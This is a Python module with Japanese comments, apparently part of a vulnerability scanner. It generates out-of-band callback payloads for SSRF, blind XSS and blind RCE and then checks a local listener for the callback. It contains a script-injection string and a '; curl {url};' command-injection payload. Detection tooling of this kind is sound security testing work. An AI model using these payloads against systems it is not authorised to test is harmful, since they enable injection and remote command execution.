"""
OOBVerifier - Out-of-Band 脆弱性検証ヘルパー

LocalOOBListener を使用して、SSRF や Blind RCE のペイロードを生成し、
検証結果を確認するための高レベルインターフェースを提供する。
"""

import logging
from typing import Tuple, Optional, Dict, Any, List
from src.core.utils.oob_listener import get_oob_listener, LocalOOBListener

logger = logging.getLogger(__name__)


class OOBVerifier:
    """OOB検証ユーティリティ"""

    def __init__(self, listener: Optional[LocalOOBListener] = None):
        self.listener = listener or get_oob_listener()

    async def start_listener(self):
        """リスナー起動（未起動の場合）"""
        await self.listener.start()

    async def stop_listener(self):
        """リスナー停止"""
        await self.listener.stop()

    def generate_ssrf_payload(self) -> Tuple[str, str]:
        """
        SSRF検証用ペイロードを生成
        
        Returns:
            (payload_url, token)
        """
        return self.listener.generate_payload()

    def generate_blind_xss_payload(self) -> Tuple[str, str]:
        """
        Blind XSS検証用ペイロードを生成
        
        Returns:
            (payload_script, token)
        """
        url, token = self.listener.generate_payload()
        # シンプルな script タグペイロード
        payload = f"\"><script src=\"{url}\"></script>"
        return payload, token

    def generate_rce_payload(self, command_injection: bool = True) -> Tuple[str, str]:
        """
        Blind RCE検証用ペイロードを生成
        
        Returns:
            (payload_command, token)
        """
        url, token = self.listener.generate_payload()
        
        # curlを使ったコールバック
        if command_injection:
            payload = f"; curl {url};"
        else:
            payload = f"curl {url}"
            
        return payload, token

    async def verify(self, token: str, timeout: float = 10.0) -> bool:
        """
        指定トークンのコールバックがあったか検証
        
        Args:
            token: 生成時に受け取ったトークン
            timeout: 待機時間（秒）
        """
        return await self.listener.wait_for_interaction(token, timeout)

    def get_details(self, token: str) -> List[Dict[str, Any]]:
        """検知詳細を取得"""
        interactions = self.listener.get_interactions(token)
        return [
            {
                "remote_ip": i.remote_ip,
                "timestamp": i.timestamp,
                "method": i.method,
                "path": i.path
            }
            for i in interactions
        ]
